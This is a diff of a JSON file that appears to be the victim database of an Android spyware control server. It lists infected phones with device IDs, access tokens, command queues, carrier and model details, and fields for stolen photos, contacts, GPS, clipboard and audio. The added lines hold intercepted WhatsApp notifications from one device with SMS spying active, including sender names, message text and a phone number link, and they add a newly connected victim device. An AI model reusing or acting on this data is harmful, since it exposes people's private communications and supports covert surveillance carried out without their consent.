@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776764981950,
+    "lastSeen": 1776764999952,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -4105,7 +4105,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776764981118,
+    "lastSeen": 1776764999070,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -4121,6 +4121,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (397 pesan): ~ Agung",
+        "content": "TAWARIN AKUN EP EP 50—1JT ❗❗❗\nTAWARIN AKUN EP EP 50—1JT ❗❗❗\nTAWARIN AKUN EP EP 50—1JT ❗❗❗\nTAWARIN AKUN EP EP 50—1JT❗❗❗\nTAWARIN AKUN EP EP 50—1JT ❗❗❗",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764982784
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (582 pesan): ~ JB RENZ SMITH KALBAR",
+        "content": "📷 850K+ cluber putih vault fjokerv2 vault gagah senjata allrof max 2 log bind\nhttps://wa.me/6289682299648",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764982561
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎eight_creativityy 🅰️ (11 pesan): Daraa",
+        "content": "🎤 Pesan suara (0.01)",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764982466
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4189 pesan dari 23 chat",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764982280
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4189 pesan dari 23 chat",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764982020
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎7Sex Message (136 pesan): ~ Amsal",
@@ -4210,6 +4250,38 @@
         "receivedAt": 1776764977044
       }
     ],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
+  },
+  {
+    "deviceId": "pxc_e501b648",
+    "deviceName": "HP-XIINZ-E979",
+    "ownerUsername": "abiv12",
+    "token": "42f963bfe947d35a7c960fecc604b095",
+    "lastSeen": 1776765002203,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-21T09:50:02.203Z",
+    "deviceInfo": {
+      "model": "OPPO CPH2473",
+      "androidVersion": "Android 12",
+      "battery": 87,
+      "network": "WiFi: <unknown ssid>",
+      "sim1": "3",
+      "sim2": "Telkomsel"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
